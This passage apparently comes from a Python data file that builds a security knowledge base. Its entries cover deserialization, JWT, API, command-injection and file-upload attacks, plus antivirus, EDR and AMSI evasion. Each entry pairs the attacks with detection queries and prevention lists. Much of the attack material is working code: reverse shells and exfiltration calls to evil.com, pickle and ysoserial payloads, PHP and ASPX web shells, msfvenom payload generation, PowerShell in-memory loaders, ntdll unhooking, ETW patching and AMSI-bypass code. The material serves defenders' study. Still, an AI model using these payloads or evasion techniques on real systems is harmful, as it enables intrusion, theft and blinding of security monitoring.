5. **Least privilege IAM**: Even if SSRF succeeds, EC2 role has minimal permissions
6. **Metadata firewall**: Azure has metadata endpoint restrictions in newer SKUs
""",
    },
    {
        "title": "Insecure Deserialization — Java, .NET, Python, PHP",
        "tags": ["deserialization", "T1190", "RCE", "java", "ysoserial", "php", "python-pickle"],
        "content": r"""# Insecure Deserialization — Java, .NET, Python, PHP

## Overview

Deserialization vulnerabilities occur when applications deserialise attacker-controlled data without validation. They often lead directly to Remote Code Execution and have been the root cause of critical breaches.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059 | Command and Scripting Interpreter | Execution |

## Java Deserialization

Java's `ObjectInputStream.readObject()` + gadget chains from common libraries = RCE.

```bash
# ysoserial -- generate serialised gadget chain payloads
java -jar ysoserial.jar CommonsCollections6 "curl https://evil.com/pwned -o /tmp/p" > payload.ser
java -jar ysoserial.jar Spring1 "bash -c {bash,-i,>&,/dev/tcp/10.10.10.1/4444,0>&1}" | base64

# Common gadget chains (libraries required in classpath):
# CommonsCollections1-7  -- Apache Commons Collections
# Spring1/Spring2        -- Spring Framework
# Hibernate1/2           -- Hibernate ORM
# ROME                   -- RSS/Atom feed parser

# Detection: Java serialised data starts with bytes AC ED 00 05
# Base64: rO0AB...
# Endpoints to check: JMX (1099), WebLogic T3 (7001), JBoss HTTP (8080)
```

## .NET ViewState Deserialization

```bash
# If machineKey is known (leaked or default), forge malicious ViewState
# ysoserial.net
ysoserial.exe -o base64 -g TextFormattingRunProperties -f LosFormatter -c "calc.exe"

# With known machineKey:
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell -enc B64" \\
  --validationalg="SHA1" --validationkey="MACHINEKEY"

# Delivery: POST with modified __VIEWSTATE parameter in form body
```

## Python Deserialization

```python
# pickle.loads() -- arbitrary code execution
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl https://evil.com/pwned',))

payload = pickle.dumps(Exploit())
# Send as base64 in cookie or POST body

# PyYAML yaml.load() (not safe_load) -- code execution via Python tags
import yaml
yaml.load(user_input)  # VULNERABLE

# Malicious YAML:
# !!python/object/apply:os.system ['id']
```

## PHP Deserialization

```php
// PHP unserialize() with __wakeup/__destruct POP chain gadgets
// Generate with phpggc:
phpggc Laravel/RCE1 "system('id')"
phpggc -b Symfony/RCE4 "phpinfo()"

// Delivery locations: cookies, custom headers, POST body, URL parameters
// Serialised object example: O:8:"Template":1:{s:8:"filename";s:20:"/etc/passwd";}
```

## Detection Opportunities

```kql
// Java serialised data in HTTP request
http.request.body.content: "rO0AB*"

// Large ViewState with unusual source IP
http.request.body.content: "__VIEWSTATE=*" AND
NOT source.ip: (known_corporate_ips)

// App server spawning shell after deserialization RCE
process.parent.name: ("java" OR "w3wp.exe" OR "python" OR "php-fpm") AND
process.name: ("bash" OR "sh" OR "cmd.exe" OR "powershell.exe")

// OOB DNS -- deserialization triggering DNS lookup to attacker domain
dns.question.name: "*.burpcollaborator.net" OR dns.question.name: "*.oastify.com"
```

## Prevention

1. **Avoid deserialising untrusted data**: Redesign to use JSON/XML with schema validation
2. **HMAC integrity checks**: Sign serialised data; verify before deserialising
3. **Class allowlisting**: Subclass ObjectInputStream to only allow specific safe classes
4. **Python**: Use `json` not `pickle`; `yaml.safe_load()` not `yaml.load()`
5. **PHP**: Use `json_decode()` instead of `unserialize()`
6. **Agent-based protection**: Netflix SerialKiller blocks gadget chain execution at runtime
7. **Keep dependencies patched**: Gadget chains rely on vulnerable library versions
""",
    },
    {
        "title": "Authentication and Session Attacks — JWT Flaws, Session Fixation",
        "tags": ["JWT", "session-fixation", "broken-auth", "T1550.001", "T1539", "oauth"],
        "content": r"""# Authentication and Session Attacks — JWT Flaws, Session Fixation

## Overview

Authentication and session management flaws allow attackers to impersonate users and bypass MFA. JWT misconfigurations are particularly common in modern API applications.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1550.001 | Application Access Token | Lateral Movement |
| T1539 | Steal Web Session Cookie | Credential Access |
| T1078 | Valid Accounts | Initial Access |

## JWT Attacks

### None Algorithm Attack

```python
import base64, json

# Decode JWT parts
header = json.loads(base64.b64decode("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9=="))
payload = json.loads(base64.b64decode("eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9=="))

# Modify payload
payload["role"] = "admin"

# Forge JWT with alg=none (no signature required)
h = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
p = base64.b64encode(json.dumps(payload).encode()).decode().rstrip("=")
forged = f"{h}.{p}."  # empty signature

# curl -H "Authorization: Bearer {forged}" https://api.site.com/admin
```

### RS256 to HS256 Algorithm Confusion

```python
# Server uses RS256 (asymmetric). If attacker changes to HS256 and signs with
# the PUBLIC KEY as HMAC secret, vulnerable servers accept it.

public_key = requests.get("https://site.com/.well-known/jwks.json")
# Extract PEM from JWKS

import jwt
forged = jwt.encode(
    {"user": "alice", "role": "admin"},
    public_key_pem,
    algorithm="HS256"
)
```

### Weak Secret Brute Force

```bash
# hashcat -- JWT HMAC cracking (mode 16500)
hashcat -m 16500 "eyJhbGci...SIGNATURE" wordlist.txt -r best64.rule

# jwt-cracker
jwt-cracker "JWT_TOKEN" "abcdefghijklmnopqrstuvwxyz" 6

# Use cracked secret to forge admin token:
python -c "import jwt; print(jwt.encode({'role':'admin'}, 'secret123', 'HS256'))"
```

## Session Fixation

```
1. Attacker obtains valid unauthenticated session ID from server
2. Sends victim a link embedding that session ID:
   https://site.com/login?PHPSESSID=ATTACKER_SESSION_ID
3. Victim logs in with that session ID
4. If server does NOT regenerate session ID post-login:
   -> Attacker now has an authenticated session
```

## Session Token Theft

```javascript
// Via XSS (if HttpOnly not set):
new Image().src = "https://evil.com/steal?c=" + document.cookie;

// Via network (if HTTPS not enforced):
// Wireshark: http.cookie filter
```

## Broken Password Reset

```
# Predictable tokens:
GET /reset?token=1234  (sequential)
GET /reset?token=MD5(email+timestamp)  (weak entropy)

# Host header injection:
POST /forgot-password
Host: evil.com   <- attacker-controlled
# Server sends: https://evil.com/reset?token=VALID
# Attacker intercepts token
```

## Detection Opportunities

```kql
// JWT with alg=none (base64 decode auth headers containing "alg":"none")
http.request.headers.authorization: "Bearer *" AND
base64_decode(split(authorization, ".")[0]) contains '"alg":"none"'

// Multiple failed logins then success from same IP
SecurityEvent
| where EventID in (4625, 4624)
| summarize
    failures = countif(EventID == 4625),
    successes = countif(EventID == 4624)
  by IpAddress, bin(TimeGenerated, 5m)
| where failures > 5 and successes > 0

// Session used from two geographically impossible locations
```

## Prevention

1. **Validate alg in code**: Never trust client-specified algorithm; hardcode expected algorithm
2. **Strong JWT secrets**: 256-bit random; rotate periodically
3. **Session regeneration**: Always generate new session ID on login, logout, privilege change
4. **HttpOnly + Secure + SameSite**: `Set-Cookie: s=...; HttpOnly; Secure; SameSite=Strict`
5. **Short token lifetimes**: Access tokens 15 min; refresh tokens 1 hour with rotation
6. **Password reset tokens**: Cryptographically random; single-use; expire in 15 minutes
""",
    },
    {
        "title": "API Security — BOLA, IDOR, Mass Assignment, Rate Limiting Bypass",
        "tags": ["API-security", "BOLA", "IDOR", "mass-assignment", "T1190", "broken-access-control"],
        "content": r"""# API Security — BOLA, IDOR, Mass Assignment, Rate Limiting Bypass

## Overview

APIs are the primary attack surface for modern applications. OWASP API Security Top 10 defines vulnerabilities specific to API design, many of which allow data theft and privilege escalation without traditional exploitation.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1213 | Data from Information Repositories | Collection |
| T1078 | Valid Accounts | Privilege Escalation |

## BOLA / IDOR (Broken Object Level Authorization)

Most prevalent API vulnerability. Direct object references without authorisation allow accessing other users' data.

```bash
# Normal: user accesses own profile
GET /api/v1/users/1337/profile
Authorization: Bearer <token>

# BOLA attack: change ID
GET /api/v1/users/1338/profile   <- another user's data returned

# Automated enumeration
for id in $(seq 1000 2000); do
    status=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer TOKEN" \\
             "https://api.site.com/users/$id/profile")
    [ "$status" = "200" ] && echo "Found: $id"
done

# Non-sequential: find UUIDs in other API responses, then test access
```

## Mass Assignment

```bash
# Normal account creation:
POST /api/users/register
{"username": "alice", "email": "alice@site.com", "password": "pass"}

# Mass assignment attack -- add internal fields:
POST /api/users/register
{"username": "alice", "email": "alice@site.com", "password": "pass",
 "role": "admin", "is_verified": true, "credit_balance": 9999}

# If API auto-binds ALL request fields to model -> attacker gets admin role

# Discovery: check GET /api/me response for hidden fields to try overwriting
```

## Broken Function Level Authorization (BFLA)

```bash
# Standard user accessing admin endpoints
DELETE /api/v1/admin/users/1337
Authorization: Bearer <standard_user_token>
-> Should return 403; if 200 -> BFLA

# Endpoint discovery
ffuf -u https://api.site.com/FUZZ -w api_wordlist.txt -H "Authorization: Bearer USER_TOKEN"
# Hunt for: /admin, /internal, /management, /debug, /actuator, /metrics
```

## Rate Limiting Bypass

```python
# Standard limit: 100 req/min per IP
# Bypass via rotating proxy list:
import requests, random

proxies = ["http://1.2.3.4:8080", "http://5.6.7.8:8080"]
for password in wordlist:
    proxy = random.choice(proxies)
    r = requests.post("https://api.site.com/login",
                      json={"user":"admin","pass":password},
                      proxies={"https": proxy})
    if r.status_code == 200:
        print(f"Found: {password}")
        break

# Header manipulation: some rate limiters trust X-Forwarded-For
headers = {"X-Forwarded-For": f"192.168.1.{random.randint(1,254)}"}

# HTTP/2 multiplexing: send 100 concurrent requests on single connection
# Some rate limiters count TCP connections not requests
```

## Detection Opportunities

```kql
// IDOR/BOLA: sequential ID enumeration from single user
logs
| where url.path matches regex "/api/users/[0-9]+"
| summarize
    unique_ids = dcount(extract("/([0-9]+)", 1, url.path)),
    requests = count()
  by user.id, bin(@timestamp, 5m)
| where unique_ids > 20 and requests > 20

// Mass assignment: request body contains unexpected fields
// Requires API schema enforcement + logging of extra fields

// BFLA: non-admin accessing admin endpoints
http.request.uri: ("/admin/" OR "/internal/") AND
NOT user.role: "admin"
```

## Prevention

1. **Authorisation on every object**: Always verify requesting user has rights to the specific resource
2. **Explicit allowlist for mass assignment**: Define exactly which fields are settable per role
3. **Rate limiting**: Per-user AND per-IP; token bucket; alert on limit hits
4. **API gateway**: Central enforcement of auth, rate limits, schema validation
5. **OpenAPI schema validation**: Reject requests with undocumented fields
6. **Regular API penetration testing**: OWASP API Security Top 10 checklist
7. **Comprehensive API access logs**: User ID + endpoint + response code -- essential for detecting IDOR exploitation
""",
    },
    {
        "title": "Command Injection and OS Command Execution",
        "tags": ["command-injection", "OS-command", "T1059.004", "T1190", "RCE", "commix"],
        "content": r"""# Command Injection and OS Command Execution

## Overview

Command injection allows attackers to execute arbitrary OS commands by injecting shell metacharacters into application inputs passed to system shells. One of the most impactful vulnerabilities -- direct RCE with the application's OS privileges.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial Access |
| T1059.004 | Unix Shell | Execution |
| T1059.003 | Windows Command Shell | Execution |

## Basic Injection Metacharacters

```bash
# Linux -- inject after legitimate command
?ip=127.0.0.1; id
?ip=127.0.0.1 && cat /etc/passwd
?ip=127.0.0.1 | id
?ip=`id`
?ip=$(id)
?ip=127.0.0.1%0aid      (URL-encoded newline)

# Windows
?ip=127.0.0.1 & whoami
?ip=127.0.0.1 && whoami
?ip=127.0.0.1 | whoami
```

## Blind Command Injection

When output is not returned, use time delays or out-of-band channels:

```bash
# Time delay -- detect injection exists
?host=test; sleep 10

# DNS exfiltration -- confirm execution and extract data
?host=test; nslookup `whoami`.evil.com
?host=test; curl http://evil.com/`id | base64`

# Write output to web root (if web root is known/writable)
?host=test; id > /var/www/html/out.txt
# Then: curl https://site.com/out.txt

# Burp Collaborator for automated OOB detection
?host=test; nslookup BURP_ID.burpcollaborator.net
```

## Language-Specific Vulnerabilities

```php
// PHP: shell_exec() / system() / exec() with user input
$output = shell_exec("ping -c 3 " . $_GET["host"]);
// Exploit: ?host=127.0.0.1; cat /etc/passwd

// Safe: use escapeshellarg()
$host = escapeshellarg($_GET["host"]);
$output = shell_exec("ping -c 3 " . $host);
```

```python
# Python: os.system() / subprocess with shell=True
import os
os.system("ping -c 3 " + user_input)  # VULNERABLE

# Safe: array form, no shell
import subprocess
subprocess.run(["ping", "-c", "3", user_input])  # input not interpreted by shell
```

```javascript
// Node.js: exec() with user input
const { exec } = require("child_process");
exec("ls " + userInput, callback);  // VULNERABLE

// Safe: execFile (array args, no shell)
const { execFile } = require("child_process");
execFile("/bin/ls", [userInput], callback);
```

## Testing Tools

```bash
# commix -- automated command injection testing
commix --url="https://site.com/ping?ip=127.0.0.1" --level=3

# Manual with Burp Suite Intruder:
# Payloads: SecLists/Fuzzing/command-injection-commix.txt
# Match grep: "uid=" OR "root:" OR Collaborator DNS hit

# sqlmap --os-shell: escalate from SQLi to OS command execution
sqlmap -u "https://site.com/?id=1" --os-shell
```

## Detection Opportunities

```kql
// Shell metacharacters in web parameters
http.request.uri: ("; " OR " && " OR " || " OR " | id" OR "%60" OR "%0a") AND
http.response.status_code: (200 OR 500)

// Ping/sleep/curl patterns
http.request.uri: (/ping.+-c/ OR "sleep" OR "curl+" OR "wget+")

// Web server spawning shell process (EDR/Sysmon)
process.parent.name: ("httpd" OR "nginx" OR "node" OR "python" OR "php-fpm") AND
process.name: ("bash" OR "sh" OR "cmd.exe" OR "powershell.exe")

// DNS lookups from web server process to unusual external domains
```

## Prevention

1. **Never use shell interpretation with user input**: Array args form; no `shell=True`
2. **Input validation**: Whitelist allowed characters (e.g. only `[a-zA-Z0-9.-]` for hostnames)
3. **escapeshellarg() / shlex.quote()**: Escape user input if shell use is unavoidable
4. **Least privilege**: Web process cannot read /etc/shadow or write outside web root
5. **WAF**: Block shell metacharacters in web request parameters
6. **Disable dangerous PHP functions**: `disable_functions = exec,system,shell_exec,passthru,proc_open`
""",
    },
    {
        "title": "File Upload Vulnerabilities — Web Shells, Polyglot Files",
        "tags": ["file-upload", "web-shell", "polyglot", "T1505.003", "T1190", "persistence"],
        "content": r"""# File Upload Vulnerabilities — Web Shells, Polyglot Files

## Overview

Unrestricted file upload vulnerabilities allow uploading malicious files and executing them server-side. A successfully uploaded web shell provides persistent on-demand RCE.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1505.003 | Web Shell | Persistence |
| T1190 | Exploit Public-Facing Application | Initial Access |

## Web Shell Payloads

```php
<?php system($_GET["cmd"]); ?>

<?php
if(isset($_REQUEST["cmd"])){
    echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>";
}
?>
```

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
</script>
```

## Bypassing Upload Restrictions

```
# Extension bypasses (when .php is blocked):
.php3, .php4, .php5, .php7, .phtml, .phar
.pHp  (case variation)
shell.php.jpg  (double extension if server uses last ext)
shell.php%00.jpg  (null byte -- truncates to .php in some implementations)
shell.php.  (trailing dot -- Windows strips it)
shell.php::$DATA  (NTFS ADS)

# MIME type bypass: change Content-Type in intercepted request
# Blocked:
Content-Type: application/x-php
# Bypass:
Content-Type: image/jpeg  <- still executes as PHP if stored with .php extension

# Magic bytes: prepend JPEG header before PHP payload
# FF D8 FF E0 (JPEG magic) + PHP code
# Bypasses tools that read magic bytes for type detection
```

## Polyglot Files

Valid as two formats simultaneously:

```bash
# JPEG+PHP polyglot using exiftool
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" legitimate.jpg
cp legitimate.jpg shell.php.jpg
# Valid JPEG, but PHP content executes if .php extension is used

# PDF+PHP polyglot
# Minimal valid PDF with embedded PHP in a stream
# Bypasses PDF-specific content validation
```

## Post-Upload Web Shell Usage

```bash
# Once shell.php is uploaded to /uploads/shell.php:
curl "https://site.com/uploads/shell.php?cmd=id"
curl "https://site.com/uploads/shell.php?cmd=cat+/etc/passwd"

# Upgrade to reverse shell
curl "https://site.com/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/evil.com/4444+0>%261'"

# China Chopper -- compact web shell widely used by APT groups
# Client-side: chopper.exe connects to server with the shell
# Server-side (1 line): <?php @eval($_POST["pass"]);?>
```

## Detection Opportunities

```kql
// File upload followed by execution request to same file
// Step 1: POST /upload (multipart) -> file stored
// Step 2: GET /uploads/shell.php?cmd=id -> command output returned

http.request.method: "GET" AND
http.request.uri: (/uploads.*\\.(php|aspx|jsp|phtml|phar)/) AND
(http.request.uri: ("cmd=" OR "exec=" OR "c=") OR
 http.response.body_bytes > 0 AND http.response.status_code: 200)

// New PHP/ASPX file created in web root by web server process (Sysmon Event 11)
event.code: "11" AND
file.path: ("*/www/html/*" OR "*/wwwroot/*" OR "*/uploads/*") AND
file.extension: ("php" OR "aspx" OR "jsp" OR "phar") AND
process.name: ("httpd" OR "nginx" OR "w3wp.exe" OR "php-fpm")

// Web server spawning shell after web shell execution
process.parent.name: ("httpd" OR "nginx" OR "w3wp.exe") AND
process.name: ("bash" OR "sh" OR "cmd.exe" OR "id" OR "whoami")
```

## Prevention

1. **Store uploads outside web root**: /var/uploads/ not /var/www/html/uploads/ -- cannot be executed
2. **Rename files**: Generate UUID filename; strip original extension entirely
3. **Content validation**: Verify content matches declared type with libmagic; AV scan
4. **Disable execution in upload directories**: `php_flag engine off` in .htaccess; `Options -ExecCGI`
5. **Use CDN / object storage**: Serve uploads from S3/Azure Blob where PHP execution is impossible
6. **FIM**: Alert on new .php/.aspx files created in web root by web server process
""",
    },
]


# ============================================================
# COLLECTION 5: EVASION & ANTI-DETECTION
# ============================================================

EVASION_TECHNIQUES = [
    {
        "title": "Antivirus Evasion — Obfuscation, Packers, Crypters, In-Memory Execution",
        "tags": ["AV-evasion", "obfuscation", "packers", "in-memory", "T1027", "T1045", "defense-evasion"],
        "content": r"""# Antivirus Evasion — Obfuscation, Packers, Crypters, In-Memory Execution

## Overview

Antivirus evasion allows malicious code to bypass signature-based detection. Modern attackers combine multiple techniques: custom packers, runtime decryption, in-memory execution, and code obfuscation. Understanding these techniques helps SOC analysts identify suspicious binaries that evade traditional AV.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1027 | Obfuscated Files or Information | Defense Evasion |
| T1027.002 | Software Packing | Defense Evasion |
| T1045 | Software Packing | Defense Evasion |
| T1055 | Process Injection | Defense Evasion |
| T1620 | Reflective Code Loading | Defense Evasion |

## Technique 1 — Signature-Based Bypass

AV signatures match byte patterns in files. Simple bypasses:

```bash
# Change a single byte in a known-bad string
# Original Mimikatz string: "sekurlsa"
# Modified: "s3kurls4" or XOR the string bytes

# msfvenom payload generation with encoder
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=evil.com LPORT=443 -e x64/xor_dynamic -i 10 -f exe -o payload.exe

# Check against VirusTotal clone (without uploading to VT)
# ThreatCheck: identifies which AV engine and which bytes trigger detection
ThreatCheck.exe -f payload.exe
# Output: bad bytes at offset 0x1234 -> modify those bytes
```

## Technique 2 — Packers and Crypters

Packers compress the payload; crypters encrypt it. The stub (unpacking/decrypting code) loads the real payload only at runtime.

```
Packed binary structure:
+------------------+
| Stub (small)     | <- This is what AV scans on disk
|  -> Decrypt()    |
|  -> Allocate()   |
|  -> Copy()       |
|  -> Execute()    |
+------------------+
| Encrypted Payload| <- Original malware, encrypted/compressed
+------------------+

Runtime execution:
1. Stub runs
2. Decrypts payload in memory
3. Executes from memory (never written to disk)
4. AV only sees encrypted blob on disk -> no signature match
```

```python
# Simple XOR crypter (Python)
import os, sys

KEY = 0xAB

def xor_encrypt(data, key):
    return bytes([b ^ key for b in data])

with open("payload.bin", "rb") as f:
    payload = f.read()

encrypted = xor_encrypt(payload, KEY)

# Stub (C):
# BYTE key = 0xAB;
# for(int i=0; i<len; i++) buf[i] ^= key;
# // then execute buf in memory
```

## Technique 3 — In-Memory Execution (Fileless)

Never write to disk. Load and execute directly from memory.

```powershell
# PowerShell: download and execute .NET assembly in memory
$bytes = (New-Object Net.WebClient).DownloadData("http://evil.com/payload.exe")
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint
$entry.Invoke($null, @(,[string[]]@()))

# Donut - convert any PE/DLL/.NET to shellcode for in-memory injection
donut.exe -f payload.exe -o shellcode.bin -a 2  # x64

# Shellcode runner (PowerShell)
[Byte[]] $sc = [System.IO.File]::ReadAllBytes("shellcode.bin")
$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $ptr, $sc.Length)
$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [type]$delegate)
$func.Invoke()
```

## Technique 4 — Obfuscation

```python
# String obfuscation: split strings to avoid pattern matching
# "sekurlsa" -> "sek" + "url" + "sa"
cmd = "sek" + "url" + "sa" + "::" + "log" + "on" + "pass" + "words"

# Base64 encoding
import base64
cmd = base64.b64decode("c2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRz").decode()

# Character substitution
cmd = chr(115)+chr(101)+chr(107)+chr(117)+chr(114)+chr(108)+chr(115)+chr(97)

# Variable name randomisation (obfuscators like Invoke-Obfuscation)
```

## Detection Opportunities

```kql
// High entropy files (packed/encrypted binaries)
// Entropy > 7.2 suggests packing/encryption
// EDR file creation events with entropy scoring

// Suspicious memory allocation patterns (Sysmon)
// Event 8: CreateRemoteThread
// Event 10: ProcessAccess with memory operations

// PowerShell loading .NET assembly from memory
event.code: "4104" AND
powershell.file.script_block_text: ("[System.Reflection.Assembly]::Load" OR
                                    "DownloadData" OR "AllocHGlobal")

// Binary created then immediately deleted (dropped dropper)
// File create (Event 11) followed by file delete (Event 23) for same file within 60s
```

## Prevention

1. **Behavioural detection over signatures**: EDR that monitors execution behaviour, not just file hashes
2. **Memory scanning**: Scan allocated memory regions for shellcode patterns
3. **AMSI**: Inspects PowerShell/VBScript in memory before execution
4. **Script Block Logging (Event 4104)**: Captures deobfuscated PowerShell regardless of obfuscation
5. **Application allowlisting**: Only signed binaries from trusted publishers can execute
6. **ETW-based detection**: Windows ETW catches memory allocation patterns even for fileless attacks
""",
    },
    {
        "title": "EDR Evasion — Unhooking, Direct Syscalls, ETW Patching",
        "tags": ["EDR-evasion", "unhooking", "direct-syscalls", "ETW", "T1562.001", "T1027"],
        "content": r"""# EDR Evasion — Unhooking, Direct Syscalls, ETW Patching

## Overview

Modern EDRs inject DLLs into processes and hook NTAPI functions to intercept suspicious calls. Attackers bypass this by removing hooks (unhooking), calling syscalls directly (bypassing hooks entirely), or patching Event Tracing for Windows (ETW) to blind telemetry.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1562.001 | Impair Defenses: Disable or Modify Tools | Defense Evasion |
| T1027 | Obfuscated Files or Information | Defense Evasion |

## How EDR Hooks Work

```
Normal call flow (EDR present):
Process -> NtCreateThread (ntdll.dll) -> EDR hook -> EDR inspects args -> real syscall

EDR hook in ntdll.dll:
NtCreateThread:
  JMP 0xEDR_HOOK_ADDRESS    <- EDR replaced first bytes with JMP to its DLL
  (original bytes saved in trampoline)

EDR hook DLL:
  inspect_arguments()
  log_to_kernel_driver()
  if (suspicious): block()
  else: call_trampoline()     <- calls original code
```

## Technique 1 — Userland Unhooking

Restore original ntdll.dll bytes from disk (which has no hooks):

```c
// Load a fresh copy of ntdll from disk and copy .text section over the hooked in-memory copy
HANDLE hNtdll = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMappingA(hNtdll, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// Get .text section from fresh copy
PIMAGE_NT_HEADERS pNTH = RtlImageNtHeader(pMapping);
PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNTH);

// Find .text section and overwrite in-memory ntdll
DWORD oldProtect;
VirtualProtect(in_memory_text, section_size, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(in_memory_text, fresh_text, section_size);
VirtualProtect(in_memory_text, section_size, oldProtect, &oldProtect);

// Tools that implement this:
// ShellyCoat, RefleXXion, Freshycalls
```

## Technique 2 — Direct Syscalls

Bypass ntdll hooks entirely by issuing syscalls directly using the syscall instruction:

```asm
; Direct syscall stub for NtAllocateVirtualMemory (Windows 10 21H2 = SSN 0x18)
NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, 18h    ; Syscall Service Number (SSN)
    syscall
    ret
NtAllocateVirtualMemory ENDP
```

```c
// SysWhispers3 - generates direct syscall stubs for all NT functions
// Usage: SysWhispers3 --preset all --out syscalls
// Then include syscalls.h and syscalls.c in your project

// HellsGate - dynamically resolves SSNs at runtime (no hardcoded numbers)
// Parses ntdll.dll from disk to find current SSNs

// Halo's Gate - SSN resolution via neighbouring functions (if target function is hooked)
```

## Technique 3 — ETW Patching

Event Tracing for Windows provides telemetry to EDRs. Patching ETW blinds logging:

```c
// Patch EtwEventWrite to return immediately (no events written)
// Find EtwEventWrite in ntdll.dll
FARPROC pEtw = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

DWORD oldProtect;
VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

// Overwrite first byte with RET (0xC3) - function returns immediately
*(BYTE *)pEtw = 0xC3;

VirtualProtect(pEtw, 1, oldProtect, &oldProtect);

// Now: no ETW events generated by this process -> EDR loses telemetry
```

```powershell
# PowerShell ETW bypass
$patched = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $patched.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null,$true)
```

## Detection Opportunities

```kql
// Sysmon Event 10: Process access to ntdll.dll
// EDR should alert on VirtualProtect + WriteProcessMemory targeting ntdll
event.code: "10" AND
winlog.event_data.TargetImage: "ntdll.dll" AND
winlog.event_data.GrantedAccess: "0x1010"

// Sysmon Event 8: CreateRemoteThread into a process
// Combined with low-level memory writes

// ETW patching: process with no ETW events but high CPU/network activity
// Baseline: compare ETW event rate for process category vs actual events

// Kernel-mode detection: PatchGuard / Hypervisor Code Integrity (HVCI)
// Detects userland hook removal from kernel level
// Most enterprise EDRs have kernel components that survive userland patching
```

## Prevention

1. **Kernel-mode EDR components**: Kernel callbacks (PsSetCreateProcessNotifyRoutine etc.) cannot be bypassed by userland unhooking
2. **HVCI (Hypervisor Code Integrity)**: Prevents unsigned code from running in kernel
3. **Credential Guard**: VSM isolation prevents memory attacks on LSASS even without hooks
4. **ETW-TI (ETW Threat Intelligence)**: Kernel-mode ETW provider not patchable from userland
5. **Canary bytes**: Some EDRs detect when their hooks are removed (monitor ntdll integrity)
6. **Behaviour-based detection**: Focus on what process DOES, not how it calls syscalls
""",
    },
    {
        "title": "AMSI Bypass Techniques and Detection",
        "tags": ["AMSI", "bypass", "T1562.001", "powershell", "defense-evasion", "script-scanning"],
        "content": r"""# AMSI Bypass Techniques and Detection

## Overview

The Antimalware Scan Interface (AMSI) allows AV/EDR to scan scripts (PowerShell, VBScript, JScript, .NET) in memory before execution, bypassing the problem of obfuscated on-disk files. Attackers bypass AMSI before loading offensive tools in memory. SOC analysts must understand AMSI and its bypass techniques to detect in-memory attacks.

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1562.001 | Impair Defenses: Disable or Modify Tools | Defense Evasion |
| T1027 | Obfuscated Files or Information | Defense Evasion |

## How AMSI Works

```
PowerShell loads script
    -> AmsiScanBuffer() called with script content
    -> Passes content to registered AV provider
    -> AV returns: AMSI_RESULT_CLEAN or AMSI_RESULT_DETECTED
    -> If detected: PowerShell throws "This script contains malicious content"
```

AMSI is implemented in `amsi.dll`, loaded into every PowerShell/JScript/VBScript process.

## Bypass Techniques

### 1. AmsiInitFailed Flag (Classic)

```powershell
# Set amsiInitFailed = true -> AMSI not initialised -> no scanning
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Variation using type acceleration:
$a='System.Management.Automation.AmsiUtils';$b='amsiInitFailed';
[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
```

### 2. Memory Patching (AmsiScanBuffer)

```c
// Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN (1)
void PatchAmsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    FARPROC pScan = GetProcAddress(amsi, "AmsiScanBuffer");

    // Patch: return 1 (AMSI_RESULT_CLEAN) immediately
    BYTE patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};  // mov eax, 0x80070057; ret
    DWORD old;
    VirtualProtect(pScan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(pScan, patch, sizeof(patch));
    VirtualProtect(pScan, sizeof(patch), old, &old);
}
```

### 3. String Obfuscation to Avoid AMSI Signatures

```powershell
# AMSI signatures often match known-bad strings
# "amsiInitFailed" itself is now flagged

